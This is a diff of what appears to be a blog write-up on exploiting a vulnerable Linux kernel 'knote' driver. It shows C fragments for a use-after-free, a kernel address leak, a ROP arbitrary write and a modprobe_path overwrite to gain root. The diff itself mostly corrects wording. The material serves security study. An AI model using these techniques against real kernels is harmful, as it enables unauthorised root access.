@@ -133,7 +133,7 @@ struct knote *knotes[10];</code></pre>
             knotes[ku.idx]->decrypt_func = knote_decrypt;
             break;</code></pre>
 <p><h2>Exploit</h2>(This post skips the hours of debugging and understanding how the values were organized and the possibilities of exploitation to evelate privileges in userland).</p>
-<p>A function were created to identify the success or failure of operations <mark>call_ioctl</mark>. The first allocation sets the index to 0, which will be the corrupted object, length is set to <mark>0x20</mark> with the data pointer to a random value to trigger the if statement, executing and freeing the kernel allocations.</p>
+<p>A function was created to identify the success or failure of operations <mark>call_ioctl</mark>. The first allocation sets the index to 0, which will be the corrupted object, length is set to <mark>0x20</mark> with the data pointer to a random value to trigger the if statement, executing and freeing the kernel allocations.</p>
 <pre><code class="language-c">// OBJECT 1
 ku.idx  = 0;
 ku.len  = 0x20;
@@ -151,7 +151,7 @@ call_ioctl(fd, KNOTE_READ, ku2);
 unsigned long int object_leak = p[2];
 printf("OBJECT_LEAK = %lx\n", object_leak);
 </code></pre>
-<p>To leak the address, an allocation of <mark>0x400</mark> bytes was made to obtain a random pointer availible in this running kernel. It's important to consider that in real world exploits, such actions can cause inconsistences in the exploitation process, there is no guarantee that a random pointer will always be present in the running instance, setups are differents and the kernel states are different. A good approach to be assetive is to spray objects that contains the same size, a pointer to a kernel address and get the pointer from the sprayed objects, this way reliability will increase.</p>
+<p>To leak the address, an allocation of <mark>0x400</mark> bytes was made to obtain a random pointer availible in this running kernel. It's important to consider that in real world exploits, such actions can cause inconsistences in the exploitation process, there is no guarantee that a random pointer will always be present in the running instance, setups are differents and the kernel states are different. A good approach is to spray objects that contains the same size, a pointer to a kernel address and get the pointer from the sprayed objects, this way reliability will increase.</p>
 <p>The kernel base was calculated from the extracted offset.</p>
 <pre><code class="language-c">// LEAK ADDRESSES
 ku.idx = 0;
@@ -167,7 +167,7 @@ printf("K_LEAK = 0x%lx \n",k_leak);
 printf("K_BASE = 0x%lx \n",k_base);
 call_ioctl(fd, KNOTE_DELETE, ku);
 call_ioctl(fd, KNOTE_DELETE, ku2);</code></pre>
-<p>The last part of the exploit is to replicate the technique of providing a fake  value in data to trigger free, oveeerwriting the knote object with the <mark>mov qword ptr [rsi], rdi ; ret</mark> (from the call of IOCTL encryption the two registers are controllable). To make a test in the scope of function call, fake pointers can be set in the data of the corrupted knote. When the function pointer is called and the kernel crashes, the states of registers will be shown, this helps to know the scopes that there are possibilities to control.</p>
+<p>The last part of the exploit is to replicate the technique of providing a fake  value in data to trigger free, overwriting the knote object with the <mark>mov qword ptr [rsi], rdi ; ret</mark> (from the call of IOCTL encryption the two registers are controllable). To test in function call scope, fake pointers were set in the data of the corrupted knote. When the function pointer is called and the kernel crashes, the states of registers will be shown, this helps to know the correct places that there are possibilities of control.</p>
 <pre><code class="language-c">buff[0] = deadbeefcafebab1
 buff[1] = deadbeefcafebab2
 buff[2] = deadbeefcafebab3
@@ -185,7 +185,7 @@ FS:  00000000021e53c0(0000) GS:ffffffff81832000(0000) knlGS:0000000000000000
 CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
 CR2: 00000000021e7778 CR3: 0000000007664000 CR4: 00000000000006b0
 Kernel panic - not syncing: Fatal exception</code></pre>
-<p>To escalate privileges to root, the modprobe_path override technique was used. This allows to change the path of the modprobe binary to point to a controlled file. This file will be executed with root permissions, tools like pwntools can be used to search for the string <mark>/sbin/modprobe</mark> in the kernel binary to find the correct symbol offset. The <a href="https://sam4k.com/like-techniques-modprobe_path/">sam4k</a> article explains the internals of how modprobe can be used to escalate privileges.</p>
+<p>To escalate privileges to root, the modprobe_path override technique was used. This allows to change the path of the modprobe binary to point to a controlled file. This file will be executed with root permission. Tools like pwntools can be used to search for the string <mark>/sbin/modprobe</mark> in the kernel binary to find the correct symbol offset. The <a href="https://sam4k.com/like-techniques-modprobe_path/">sam4k</a> article explains the internals of how modprobe can be used to escalate privileges.</p>
 <p>Basically, the new fake object is sent using 0x20 as size, with the part of the string that will be overwritten as <mark>/tmp/dead</mark>, the modprobe_path symbol address and the gadget <mark>mov qword ptr [rsi], rdi ; ret</mark>. To spawn the binary, it's just needed to create the malicious file that was used to override the symbol, create a file with an unknown header (the four bytes sent to /tmp/x) and calling the invalid created file, resulting in a call to the corrupted mobprobe.</p>
 <pre><code class="language-c">// ROP TO ABW
 ku.idx  = 0;
